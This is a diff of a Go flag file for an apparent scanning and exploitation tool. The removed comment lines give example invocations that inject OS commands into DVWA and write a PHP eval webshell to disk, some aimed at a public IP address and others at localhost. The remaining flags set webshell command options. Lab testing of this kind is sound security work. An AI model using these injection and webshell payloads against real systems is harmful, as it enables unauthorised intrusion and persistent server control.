@@ -39,7 +39,6 @@ func Execute(infoScan *config.InfoScan) {
 	flag.StringVar(&config.Password, "password", "", "password, for example: admin| admin,test")
 	flag.StringVar(&config.PasswordFile, "passfile", "", "password file")
 	flag.StringVar(&config.HashFile, "hashfile", "", "hash file")
-	//flag.BoolVar(&infoScan.Ping, "ping", false, "choose ping or icmp: false->icmp, true->ping")
 	flag.StringVar(&infoScan.SshKey, "sshkey", "", "sshkey file (id_rsa)")
 	flag.IntVar(&config.PocNum, "pocn", 20, "poc rate")
 	flag.StringVar(&config.PocName, "pocname", "", "choose poc name to scan, such as: sql")
@@ -59,7 +58,6 @@ func Execute(infoScan *config.InfoScan) {
 	flag.StringVar(&config.OutPutFile, "of", config.DefaultOutputFile, "output log file name")
 	flag.BoolVar(&common.SaveLogToJSON, "json", false, "save log to json file")
 	flag.BoolVar(&common.SaveLogToHTML, "html", false, "save log to html file")
-	//flag.BoolVar(&config.EnableContainer, "ec", false, "Enable docker container to run scan")
 	flag.StringVar(&config.RequestPath, "requestpath", "", "choose request path, for example: api/v1")
 	flag.StringVar(&config.RequestBody, "requestbody", "", "choose request body, for example: a=1&b=2")
 	flag.StringVar(&config.PocBody, "pocbody", "", "used for base poc, choose the poc request body, for example: 127.0.0.1&&whoami")
@@ -70,22 +68,7 @@ func Execute(infoScan *config.InfoScan) {
 	flag.StringVar(&config.WebShellCommand, "webshellcommand", "", "used for base exp, choose the command to execute in webshell, for example: pass=phpinfo();")
 	flag.StringVar(&config.CheckWebShellCmdBody, "checkwebshellcmdbody", "", "used for base exp, choose the command execute in res body, for example: PHP Version")
 	flag.BoolVar(&config.EnableInfoContainer, "enic", false, "enable infoscan module container")
-	// 记得命令行交互页面加上这两个变量
-	// -u http://47.103.86.115:8080 -requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base
-
-	//-st exploit -exptype software -ct f0f8c3cb48f51c0038f724081f08fa1c -cu 8lxlel.ceye.io -save=false -wto 30
-	// 127.0.0.1+%26%26+echo'<?php%20@eval($_GET["pass"]);?>'>../../2.php+&&+ls
-	//  -u http://47.103.86.115:8080 --requestpath vulnerabilities/exec/ -writewebshellbody '127.0.0.1+%26%26+echo'<?php%20@eval($_GET["pass"]);?>'>../../test1.php+&&+ls' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath test1.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
-	// -u http://47.103.86.115:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%26+echo%27<?php%20@eval($_GET[\"pass\"]);?>%27>../../test1.php+%26%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath test1.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
-
-	// low dvwa poc
-	// -u http://127.0.0.1:8080 --requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base
-	// medium dvwa poc
-	// -u http://127.0.0.1:8080 --requestpath vulnerabilities/exec/ -pocbody 'ip=127.0.0.1+%26;%26+whoami&Submit=Submit' -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=medium' -checkpocresbody 'www-data' -st pocscan -save=false -pocname command -poctype base
-	// low dvwa exp
-	// -u http://127.0.0.1:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%26+echo+%27%3C%3Fphp+%40eval%28%24_POST%5B%22pass%22%5D%29%3B%3F%3E%27%3E..%2F..%2F111.php+%26%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=low' -checkexpresbody 'index.php' -checkwebshellpath 111.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
-	// medium dvwa exp
-	// -u http://127.0.0.1:8080 -requestpath vulnerabilities/exec/ -writewebshellbody "ip=127.0.0.1+%26%3B%26+echo+%27%3C%3Fphp+%40eval%28%24_POST%5B%22pass%22%5D%29%3B%3F%3E%27%3E..%2F..%2F222.php+%26%3B%26+ls&Submit=Submit" -cookie 'PHPSESSID=35eb962161b9e9bb0f97a3c7a0d620cf; security=medium' -checkexpresbody 'index.php' -checkwebshellpath 222.php -webshellcommand "pass=phpinfo();" -checkwebshellcmdbody 'PHP Version' -st exploit -save=false -expname command -exptype base
+	flag.BoolVar(&config.EnableVulContainer, "envc", false, "enable pocscan and exploit module container")
 	flag.Parse()
 
 }
